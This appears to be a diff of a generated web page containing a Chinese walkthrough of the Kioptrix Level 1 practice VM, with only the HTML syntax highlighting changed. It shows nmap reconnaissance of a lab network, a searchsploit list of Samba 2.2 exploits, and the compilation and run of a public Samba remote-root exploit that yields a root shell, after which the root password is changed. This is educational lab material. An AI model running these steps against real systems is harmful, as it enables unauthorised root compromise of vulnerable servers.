@@ -3248,105 +3248,105 @@
 <ol>
 <li>攻击机 ip 使用 <code>ifconfig</code> 查询：</li>
 </ol>
-<pre><code class="language-bash">└─$ ifconfig
-eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
-        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
-        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;
-        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)
-        RX packets 210  bytes 22077 (21.5 KiB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 2448  bytes 149910 (146.3 KiB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>ifconfig
+eth0:<span class="w"> </span><span class="nv">flags</span><span class="o">=</span><span class="m">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;<span class="w">  </span>mtu<span class="w"> </span><span class="m">1500</span>
+<span class="w">        </span>inet<span class="w"> </span><span class="m">10</span>.0.2.4<span class="w">  </span>netmask<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w">  </span>broadcast<span class="w"> </span><span class="m">10</span>.0.2.255
+<span class="w">        </span>inet6<span class="w"> </span>fe80::9d17:dec1:4341:a804<span class="w">  </span>prefixlen<span class="w"> </span><span class="m">64</span><span class="w">  </span>scopeid<span class="w"> </span>0x20&lt;link&gt;
+<span class="w">        </span>ether<span class="w"> </span><span class="m">08</span>:00:27:3c:97:80<span class="w">  </span>txqueuelen<span class="w"> </span><span class="m">1000</span><span class="w">  </span><span class="o">(</span>Ethernet<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>packets<span class="w"> </span><span class="m">210</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">22077</span><span class="w"> </span><span class="o">(</span><span class="m">21</span>.5<span class="w"> </span>KiB<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w">  </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>frame<span class="w"> </span><span class="m">0</span>
+<span class="w">        </span>TX<span class="w"> </span>packets<span class="w"> </span><span class="m">2448</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">149910</span><span class="w"> </span><span class="o">(</span><span class="m">146</span>.3<span class="w"> </span>KiB<span class="o">)</span>
+<span class="w">        </span>TX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w"> </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>carrier<span class="w"> </span><span class="m">0</span><span class="w">  </span>collisions<span class="w"> </span><span class="m">0</span>
 
-lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 8  bytes 480 (480.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 8  bytes 480 (480.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-</code></pre>
+lo:<span class="w"> </span><span class="nv">flags</span><span class="o">=</span><span class="m">73</span>&lt;UP,LOOPBACK,RUNNING&gt;<span class="w">  </span>mtu<span class="w"> </span><span class="m">65536</span>
+<span class="w">        </span>inet<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w">  </span>netmask<span class="w"> </span><span class="m">255</span>.0.0.0
+<span class="w">        </span>inet6<span class="w"> </span>::1<span class="w">  </span>prefixlen<span class="w"> </span><span class="m">128</span><span class="w">  </span>scopeid<span class="w"> </span>0x10&lt;host&gt;
+<span class="w">        </span>loop<span class="w">  </span>txqueuelen<span class="w"> </span><span class="m">1000</span><span class="w">  </span><span class="o">(</span>Local<span class="w"> </span>Loopback<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>packets<span class="w"> </span><span class="m">8</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">480</span><span class="w"> </span><span class="o">(</span><span class="m">480</span>.0<span class="w"> </span>B<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w">  </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>frame<span class="w"> </span><span class="m">0</span>
+<span class="w">        </span>TX<span class="w"> </span>packets<span class="w"> </span><span class="m">8</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">480</span><span class="w"> </span><span class="o">(</span><span class="m">480</span>.0<span class="w"> </span>B<span class="o">)</span>
+<span class="w">        </span>TX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w"> </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>carrier<span class="w"> </span><span class="m">0</span><span class="w">  </span>collisions<span class="w"> </span><span class="m">0</span>
+</code></pre></div>
 <ol>
 <li>使用 nmap 扫描 ip</li>
 </ol>
-<pre><code class="language-bash">└─$ sudo nmap -sn 10.0.2.0/24
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 07:48 EDT
-Nmap scan report for bogon (10.0.2.1)
-Host is up (0.00040s latency).
-MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
-Nmap scan report for bogon (10.0.2.2)
-Host is up (0.00037s latency).
-MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
-Nmap scan report for 10.0.2.3
-Host is up (0.00032s latency).
-MAC Address: 08:00:27:4F:5B:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-Nmap scan report for 10.0.2.7
-Host is up (0.00076s latency).
-MAC Address: 08:00:27:F3:A8:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-Nmap scan report for bogon (10.0.2.4)
-Host is up.
-Nmap done: 256 IP addresses (5 hosts up) scanned in 2.03 seconds
-</code></pre>
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">10</span>.0.2.0/24
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-13<span class="w"> </span><span class="m">07</span>:48<span class="w"> </span>EDT
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>bogon<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0.2.1<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00040s<span class="w"> </span>latency<span class="o">)</span>.
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">52</span>:54:00:12:35:00<span class="w"> </span><span class="o">(</span>QEMU<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>bogon<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0.2.2<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00037s<span class="w"> </span>latency<span class="o">)</span>.
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">52</span>:54:00:12:35:00<span class="w"> </span><span class="o">(</span>QEMU<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.2.3
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00032s<span class="w"> </span>latency<span class="o">)</span>.
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:4F:5B:7F<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.2.7
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00076s<span class="w"> </span>latency<span class="o">)</span>.
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:F3:A8:F5<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>bogon<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0.2.4<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">256</span><span class="w"> </span>IP<span class="w"> </span>addresses<span class="w"> </span><span class="o">(</span><span class="m">5</span><span class="w"> </span>hosts<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.03<span class="w"> </span>seconds
+</code></pre></div>
 <ol>
 <li>注意到 <code>10.0.2.7</code> 为靶机 ip，执行 <code>nmap -sV -sC 10.0.2.7</code> 扫描之. 其中我添加了 <code>#</code> 开头的单行注释.</li>
 </ol>
-<pre><code class="language-bash">└─$ sudo nmap -sV -sC 10.0.2.7
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 07:51 EDT
-Nmap scan report for bogon (10.0.2.7)
-Host is up (0.00085s latency).
-Not shown: 994 closed tcp ports (reset)
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
-# SSH 服务
-| ssh-hostkey: 
-|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
-|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
-|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
-|_sshv1: Server supports SSHv1
-80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-# HTTP 服务
-|_http-title: Test Page for the Apache Web Server on Red Hat Linux
-|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-| http-methods: 
-|_  Potentially risky methods: TRACE
-111/tcp   open  rpcbind     2 (RPC #100000)
-# RPC 服务
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2            111/tcp   rpcbind
-|_  100000  2            111/udp   rpcbind
-139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
-# Samba 服务
-443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-# HTTPS 服务
-|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
-|_ssl-date: 2025-10-13T15:52:12+00:00; +4h00m00s from scanner time.
-| sslv2: 
-|   SSLv2 supported
-|   ciphers: 
-|     SSL2_RC2_128_CBC_WITH_MD5
-|     SSL2_RC4_128_WITH_MD5
-|     SSL2_DES_192_EDE3_CBC_WITH_MD5
-|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
-|     SSL2_RC4_64_WITH_MD5
-|     SSL2_RC4_128_EXPORT40_WITH_MD5
-|_    SSL2_DES_64_CBC_WITH_MD5
-|_http-title: 400 Bad Request
-| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
-| Not valid before: 2009-09-26T09:32:06
-|_Not valid after:  2010-09-26T09:32:06
-32768/tcp open  status      1 (RPC #100024)
-MAC Address: 08:00:27:F3:A8:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span><span class="m">10</span>.0.2.7
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-13<span class="w"> </span><span class="m">07</span>:51<span class="w"> </span>EDT
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>bogon<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0.2.7<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00085s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">994</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">     </span>VERSION
+<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">         </span>OpenSSH<span class="w"> </span><span class="m">2</span>.9p2<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">1</span>.99<span class="o">)</span>
+<span class="c1"># SSH 服务</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">1024</span><span class="w"> </span>b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86<span class="w"> </span><span class="o">(</span>RSA1<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">1024</span><span class="w"> </span>8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71<span class="w"> </span><span class="o">(</span>DSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">1024</span><span class="w"> </span>ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>_sshv1:<span class="w"> </span>Server<span class="w"> </span>supports<span class="w"> </span>SSHv1
+<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">        </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">1</span>.3.20<span class="w"> </span><span class="o">((</span>Unix<span class="o">)</span><span class="w">  </span><span class="o">(</span>Red-Hat/Linux<span class="o">)</span><span class="w"> </span>mod_ssl/2.8.4<span class="w"> </span>OpenSSL/0.9.6b<span class="o">)</span>
+<span class="c1"># HTTP 服务</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Test<span class="w"> </span>Page<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>Apache<span class="w"> </span>Web<span class="w"> </span>Server<span class="w"> </span>on<span class="w"> </span>Red<span class="w"> </span>Hat<span class="w"> </span>Linux
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/1.3.20<span class="w"> </span><span class="o">(</span>Unix<span class="o">)</span><span class="w">  </span><span class="o">(</span>Red-Hat/Linux<span class="o">)</span><span class="w"> </span>mod_ssl/2.8.4<span class="w"> </span>OpenSSL/0.9.6b
+<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+<span class="m">111</span>/tcp<span class="w">   </span>open<span class="w">  </span>rpcbind<span class="w">     </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>RPC<span class="w"> </span><span class="c1">#100000)</span>
+<span class="c1"># RPC 服务</span>
+<span class="p">|</span><span class="w"> </span>rpcinfo:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>program<span class="w"> </span>version<span class="w">    </span>port/proto<span class="w">  </span>service
+<span class="p">|</span><span class="w">   </span><span class="m">100000</span><span class="w">  </span><span class="m">2</span><span class="w">            </span><span class="m">111</span>/tcp<span class="w">   </span>rpcbind
+<span class="p">|</span>_<span class="w">  </span><span class="m">100000</span><span class="w">  </span><span class="m">2</span><span class="w">            </span><span class="m">111</span>/udp<span class="w">   </span>rpcbind
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w"> </span>Samba<span class="w"> </span>smbd<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>MYGROUP<span class="o">)</span>
+<span class="c1"># Samba 服务</span>
+<span class="m">443</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssl/https<span class="w">   </span>Apache/1.3.20<span class="w"> </span><span class="o">(</span>Unix<span class="o">)</span><span class="w">  </span><span class="o">(</span>Red-Hat/Linux<span class="o">)</span><span class="w"> </span>mod_ssl/2.8.4<span class="w"> </span>OpenSSL/0.9.6b
+<span class="c1"># HTTPS 服务</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/1.3.20<span class="w"> </span><span class="o">(</span>Unix<span class="o">)</span><span class="w">  </span><span class="o">(</span>Red-Hat/Linux<span class="o">)</span><span class="w"> </span>mod_ssl/2.8.4<span class="w"> </span>OpenSSL/0.9.6b
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-13T15:52:12+00:00<span class="p">;</span><span class="w"> </span>+4h00m00s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>sslv2:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>SSLv2<span class="w"> </span>supported
+<span class="p">|</span><span class="w">   </span>ciphers:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>SSL2_RC2_128_CBC_WITH_MD5
+<span class="p">|</span><span class="w">     </span>SSL2_RC4_128_WITH_MD5
+<span class="p">|</span><span class="w">     </span>SSL2_DES_192_EDE3_CBC_WITH_MD5
+<span class="p">|</span><span class="w">     </span>SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+<span class="p">|</span><span class="w">     </span>SSL2_RC4_64_WITH_MD5
+<span class="p">|</span><span class="w">     </span>SSL2_RC4_128_EXPORT40_WITH_MD5
+<span class="p">|</span>_<span class="w">    </span>SSL2_DES_64_CBC_WITH_MD5
+<span class="p">|</span>_http-title:<span class="w"> </span><span class="m">400</span><span class="w"> </span>Bad<span class="w"> </span>Request
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span>--
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2009</span>-09-26T09:32:06
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2010</span>-09-26T09:32:06
+<span class="m">32768</span>/tcp<span class="w"> </span>open<span class="w">  </span>status<span class="w">      </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>RPC<span class="w"> </span><span class="c1">#100024)</span>
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:F3:A8:F5<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
 
-Host script results:
-|_smb2-time: Protocol negotiation failed (SMB2)
-|_clock-skew: 3h59m59s
-|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span>_smb2-time:<span class="w"> </span>Protocol<span class="w"> </span>negotiation<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>SMB2<span class="o">)</span>
+<span class="p">|</span>_clock-skew:<span class="w"> </span>3h59m59s
+<span class="p">|</span>_nbstat:<span class="w"> </span>NetBIOS<span class="w"> </span>name:<span class="w"> </span>KIOPTRIX,<span class="w"> </span>NetBIOS<span class="w"> </span>user:<span class="w"> </span>&lt;unknown&gt;,<span class="w"> </span>NetBIOS<span class="w"> </span>MAC:<span class="w"> </span>&lt;unknown&gt;<span class="w"> </span><span class="o">(</span>unknown<span class="o">)</span>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
-</code></pre>
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">18</span>.32<span class="w"> </span>seconds
+</code></pre></div>
 <p>我们得知了其各个服务端口，同时得知了靶机操作系统为 <code>Red-Hat/Linux</code>.</p>
 <p>考虑进攻方向，这里进攻 Samba 服务，不过我们不知道其版本号.</p>
 <p>根据 SSH 服务中使用的 OpenSSH 2.9p2 的发行时间为 2001 年 6 月 17 日（OpenSSH: Release Notes: https://www.openssh.com/releasenotes.html），HTTP 服务中使用的 Apache 1.3.20 的发行时间为 2001 年 5 月 22 日（Apache Week. Apache 1.3.20 released: http://www.apacheweek.com/issues/01-05-25），故而猜测 Samba 的版本号发行时间与二者相近.</p>
@@ -3397,24 +3397,24 @@ Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
 <ol>
 <li>使用 <code>searchsploit</code> 尝试搜索漏洞：</li>
 </ol>
-<pre><code>└─$ searchsploit Samba 2.2
+<div class="highlight"><pre><span></span><code>└─$ searchsploit Samba 2.2
 ------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                           |  Path
 ------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                | unix/remote/20968.txt
 Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                             | osx/remote/9924.rb
-Samba 2.2.2 &lt; 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                  | linux/remote/16321.rb
-Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                        | bsd_x86/remote/16880.rb
+Samba 2.2.2 &lt; 2.2.6 - &#39;nttrans&#39; Remote Buffer Overflow (Metasploit) (1)                                                  | linux/remote/16321.rb
+Samba 2.2.8 (BSD x86) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                        | bsd_x86/remote/16880.rb
 Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                          | linux/local/23674.txt
-Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                      | linux_x86/remote/16861.rb
-Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                        | osx_ppc/remote/16876.rb
-Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                  | solaris_sparc/remote/16330.rb
+Samba 2.2.8 (Linux x86) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                      | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                        | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - &#39;trans2open&#39; Remote Overflow (Metasploit)                                                  | solaris_sparc/remote/16330.rb
 Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                | linux/remote/55.c
-Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                               | unix/remote/22468.c
-Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                               | unix/remote/22469.c
-Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                               | unix/remote/22470.c
-Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                               | unix/remote/22471.txt
-Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                     | linux/remote/9936.rb
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (1)                                                               | unix/remote/22468.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (2)                                                               | unix/remote/22469.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (3)                                                               | unix/remote/22470.c
+Samba 2.2.x - &#39;call_trans2open&#39; Remote Buffer Overflow (4)                                                               | unix/remote/22471.txt
+Samba 2.2.x - &#39;nttrans&#39; Remote Overflow (Metasploit)                                                                     | linux/remote/9936.rb
 Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                  | unix/remote/22356.c
 Samba 2.2.x - Remote Buffer Overflow                                                                                     | linux/remote/7.pl
 Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                        | multiple/remote/10.c
@@ -3422,11 +3422,10 @@ Samba &lt; 3.0.20 - Remote Heap Overflow                                        
 Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py
 ------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-
-</code></pre>
+</code></pre></div>
 <p>这个工具提供了针对 Samba 2.2.8 (Linux/BSD) 的工具（脚本），位于 <code>multiple/remote/10.c</code>，可以__远程代码执行__（remote code execution, RCE）攻击靶机.</p>
 <p>运行这个脚本：</p>
-<pre><code>└─$ gcc -std=gnu89 10.c -o samba                                                                                                                    
+<div class="highlight"><pre><span></span><code>└─$ gcc -std=gnu89 10.c -o samba                                                                                                                    
 └─$ ./samba                                                                                                                                                
 samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
@@ -3460,8 +3459,7 @@ samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
 *** JE MOET JE MUIL HOUWE
 Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
 uid=0(root) gid=0(root) groups=99(nobody)
-
-</code></pre>
+</code></pre></div>
 <p>进而进入到命令行页面，使用 <code>whoami</code> 确认身份为 <code>root</code>，随即使用 <code>passwd</code> 命令修改密码，其显示我们更改成功.</p>
 <p><img alt="2-1" src="../2-1.png" /></p>
 <p>然后回到靶机界面利用我们更改成功的密码登陆之，结果是成功的.</p>
